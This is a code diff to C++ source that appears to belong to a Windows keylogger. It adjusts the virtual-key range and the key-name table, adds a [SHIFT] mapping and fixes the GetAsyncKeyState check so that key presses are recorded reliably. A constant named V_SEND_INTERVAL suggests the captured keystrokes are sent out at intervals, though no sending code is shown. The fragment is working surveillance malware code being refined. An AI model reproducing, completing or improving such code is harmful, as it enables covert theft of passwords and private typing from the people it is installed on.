@@ -21,7 +21,7 @@ void VErrorBox(const TCHAR* msg);
 const int V_SEND_INTERVAL = 10000;
 const int V_IDLE_TIME = 1;
 
-const int V_KEY_BEGIN   = 0x09; // [BACK]
+const int V_KEY_BEGIN   = 0x08; // [BACK]
 const int V_KEY_END     = 0xA5; // [RALT]
 
 std::vector<const char*> keysPressed;
@@ -30,7 +30,7 @@ std::vector<const char*> keysPressed;
 const char* keyStrings[] =
 {
     0, 0, 0, 0, 0, 0, 0, 0, "[BACK]", "[TAB]", 0, 0, 0, "[ENTER]", 0, 0,
-    0, "[CTRL]", "[ALT]", "[PAUSE]", "[CAPS]", 0, 0, 0, 0, 0, 0, "[ESC]", 0, 0, 0, 0,
+    "[SHIFT]", "[CTRL]", "[ALT]", "[PAUSE]", "[CAPS]", 0, 0, 0, 0, 0, 0, "[ESC]", 0, 0, 0, 0,
     " ", "[PGUP]", "[PGDOWN]", "[END]", "[HOME]", "[<]", "[^]", "[>]", "[v]", "[SELECT]", "[PRINT]", "[EXECUTE]", "[PRINTSCREEN]", "[INS]", "[DEL]", "[HELP]",
     "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", 0, 0, 0, 0, 0, 0,
     0, "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O",
@@ -39,7 +39,7 @@ const char* keyStrings[] =
     "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]", "[F11]", "[F12]", "[F13]", "[F14]", "[F15]", "[F16]",
     "[F17]", "[F18]", "[F19]", "[F20]", "[F21]", "[F22]", "[F23]", "[F24]", 0, 0, 0, 0, 0, 0, 0, 0,
     "[NUMLOCK]", "[SCROLLLOCK]", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
-    "[LSHIFT]", "[RSHIFT]", "[LCTRL]", "[RCTRL]", "[LALT]", "[RALT]", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
@@ -136,7 +136,7 @@ void VRun()
 
 void VCheckKey(short i, bool shift)
 {
-    if (GetAsyncKeyState(i))
+    if (GetAsyncKeyState(i) & 0x8000)
 	{
         if (!keysActive[i])
         {
